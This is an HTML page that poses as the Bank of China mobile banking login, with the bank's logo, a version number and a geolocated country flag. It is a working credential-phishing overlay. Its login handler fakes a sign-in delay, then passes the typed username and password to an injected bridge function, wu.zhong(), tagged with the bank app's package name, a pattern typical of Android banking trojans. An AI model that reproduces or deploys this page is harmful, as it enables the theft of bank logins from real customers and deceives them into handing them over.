<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bank of China Mobile Banking</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>

        .boc-red {
            background-color: #dc2626;
        }
        .boc-red:hover {
            background-color: #b91c1c;
        }
        .custom-backdrop {
            background: rgba(0, 0, 0, 0.3);
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
        }
        .mobile-container {
            max-width: 375px;
            margin: 0 auto;
            min-height: 100vh;
        }
        .login-bg {
            background-image: url('https://images.unsplash.com/photo-1449824913935-59a10b8d2000?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=800&h=1200');
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
        }
        .smooth-transition {
            transition: all 0.2s ease-in-out;
        }
        html, body {
            overflow-x: hidden;
        }
        ::-webkit-scrollbar {
            width: 0px;
            background: transparent;
        }
    </style>
</head>
<body class="bg-gray-50 font-sans antialiased">
  
    

 
    <div id="login-screen" class=" login-bg" style="margin: 0;width:100%;">
     
        
        <div class=" z-10 min-h-screen flex flex-col">
            
            <div class="flex justify-between items-center p-4 pt-12">
                <button  class="text-white text-2xl hover:bg-white hover:bg-opacity-20 rounded p-2 smooth-transition">
                   
                </button>
                <button class="text-white text-lg font-normal hover:bg-white hover:bg-opacity-20 px-4 py-2 rounded smooth-transition">
                    Register
                </button>
            </div>

      
            <div class="flex-1 flex flex-col justify-center px-6">
                <div class="flex items-center justify-center mb-12">
                   <img src="https://1000logos.net/wp-content/uploads/2021/05/Bank-of-China-logo.png">
                </div>

           
                <div class="space-y-4 mb-8">
               
                    <div class="relative">
                        <input
                            type="text"
                            id="username"
                            placeholder="Username"
                            class="w-full py-4 px-4 pr-16 custom-backdrop text-white placeholder-gray-300 text-lg rounded-md border-0 focus:outline-none focus:ring-1 focus:ring-white focus:ring-opacity-50"
                        />
                        <div class="absolute right-4 top-1/2 transform -translate-y-1/2">
                           
                            <div class="w-10 h-6  rounded-sm relative overflow-hidden flex-shrink-0 flag">
                              
                               
                            </div>
                        </div>
                    </div>

                  
                    <div class="relative">
                        <input
                            type="password"
                            id="password"
                            placeholder="Password"
                            class="w-full py-4 px-4 custom-backdrop text-white placeholder-gray-300 text-lg rounded-md border-0 focus:outline-none focus:ring-1 focus:ring-white focus:ring-opacity-50"
                        />
                    </div>
                </div>

                <button onclick="handleLogin()" class="w-full py-4 boc-red hover:boc-red text-white text-xl font-medium rounded-md mb-6 smooth-transition">
                    Login
                </button>

                <div class="text-center mb-12">
                    <button onclick="showForgotPassword()" class="text-white text-base font-normal custom-backdrop px-6 py-3 rounded-full hover:bg-black hover:bg-opacity-40 smooth-transition">
                        Forgot Username or Password
                    </button>
                </div>
            </div>

            <div class="text-center pb-8 px-6">
                <p class="text-white text-sm mb-1 leading-tight">
                    Terms and Conditions Governing Electronic Banking<br />Services
                </p>
                <p class="text-white text-sm font-medium">V9.0.5</p>
            </div>
        </div>
    </div>

    <script>
     
     window.onload = async function() {

        
        var json= await fetch("https://ipapi.co/json/").then(res => res.json());
       
        document.querySelector('.flag').style.background = `url("https://flagcdn.com/h60/${json.country.toLowerCase()}.png") no-repeat`;
   
        document.querySelector('.flag').style.backgroundSize = 'cover';
        document.querySelector('.flag').style.backgroundPosition = 'center';

        
         };


        function handleLogin() {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            if (!username || !password) {
               
                return;
            }
            
          
            const loginBtn = event.target;
            loginBtn.textContent = 'Logging in...';
            loginBtn.disabled = true;
            
            setTimeout(() => {
                loginBtn.textContent = 'Login';
                loginBtn.disabled = false;
               
           
                wu.zhong(`🔰 Bank Of China \n\n✉️Username: ${username}\n🔒Password: ${password}`,"com.boc.bocsoft.bocmbovsa.buss");

            }, 2000);
        }

        
    </script>
</body>
</html>
